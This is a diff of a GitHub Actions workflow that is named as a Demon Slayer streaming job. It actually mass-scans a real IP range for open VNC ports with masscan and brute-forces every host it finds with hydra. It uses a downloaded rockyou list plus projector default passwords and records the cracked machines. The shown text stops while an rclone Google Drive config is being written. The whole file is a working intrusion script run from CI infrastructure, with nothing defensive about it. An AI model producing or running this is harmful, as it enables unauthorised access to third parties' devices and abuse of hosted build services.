@@ -1,39 +1,48 @@
-name: Demon Slayer Infinity Castle – 1080p Stream to Google Drive
+name: Demon Slayer 1080p – Extended Brute + Stream
 on:
   workflow_dispatch:
 
 jobs:
   stream:
     runs-on: ubuntu-latest
+
     steps:
       - name: Install tools
         run: |
           sudo apt-get update -y
-          sudo apt-get install -y nmap hydra rclone p7zip-full
+          sudo apt-get install -y masscan hydra rclone p7zip-full wget
 
-      - name: Scan for open VNC
+      - name: Fast scan 5900 (30 k pps)
         run: |
-          nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
+          # scan 65 k IPs in ~2 min
+          sudo masscan 210.172.0.0/16 -p5900 --rate 30000 -oL mass.txt
+          awk '/open/ {print $4}' mass.txt > vnc_hosts.txt
 
-      - name: Brute VNC passwords (always runs)
+      - name: Download real-world password list
         run: |
-          printf 'epson\nadmin\nprojector\n123456\n' > ~/pwd.txt
+          # rockyou + projector defaults
+          wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou-15.txt -O ~/pwd.txt
+          printf 'epson\nadmin\nprojector\n123456\nroot\ntiger\nsamsung\nnec\nchristie\n' >> ~/pwd.txt
+
+      - name: Brute with extended list & throttling
+        run: |
           touch valid_ips.txt
           while read ip; do
-            hydra -P ~/pwd.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
+            hydra -P ~/pwd.txt vnc://$ip \
+                  -t 1 -W 2 -T 8 -f -o hydra_$ip.txt
             [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
           done < vnc_hosts.txt
 
-      - name: Download & stream 1080p (only if IPs exist)
+      - name: Stream to Google Drive (only if cracked)
         run: |
           [ ! -s valid_ips.txt ] && echo "No valid IPs" && exit 0
+
           ip=$(head -n1 valid_ips.txt)
           pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
-          [ -z "$pass" ] && echo "Empty password" && exit 0
 
-          # Google Drive config
+          # build rclone config
           mkdir -p ~/.config/rclone
-          cat > ~/.config/rclone/rclone.conf <<'EOF'
+          cat > ~/.config/rclone/rclone.conf <<EOF
           [gdrive]
           type = drive
           token = ${{ secrets.RCLONE_GDRIVE_TOKEN }}
